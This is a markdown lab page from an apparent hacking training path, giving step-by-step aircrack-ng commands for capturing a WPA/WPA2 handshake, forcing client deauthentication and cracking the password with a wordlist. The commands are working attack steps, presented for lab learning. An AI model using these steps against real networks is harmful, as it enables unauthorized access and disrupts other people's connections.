# Lab 01: Wireless Hacking (Aircrack-ng)

[🏠 Path Home](Home.md) | [Next Lab ➡️](Lab-02-Intermediate-Track-Mobile-Security.md)

---

## 🎯 Lab Objective
Hack WPA/WPA2 wireless networks.

## 🌐 Direct Lab Access
- TryHackMe: https://tryhackme.com/room/wifihacking101
- Aircrack-ng Docs: https://www.aircrack-ng.org/documentation.html

---

## 🛠️ Required Tools
- Aircrack-ng suite
- Wireless adapter in monitor mode

---

## 📝 Step-by-Step Guide

### 1. Start Monitor Mode
```bash
sudo airmon-ng start wlan0
# Now interface is wlan0mon
```

### 2. Scan for Networks
```bash
sudo airodump-ng wlan0mon
# Note BSSID, Channel, ESSID
```

### 3. Capture Handshake
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon
```

### 4. Deauthenticate Client
```bash
# In new terminal
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

### 5. Crack Handshake
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap
```

---

## 🔗 Additional Resources
- Aircrack-ng Wiki: https://www.aircrack-ng.org/doku.php

---

[🏠 Path Home](Home.md) | [Next Lab ➡️](Lab-02-Intermediate-Track-Mobile-Security.md)
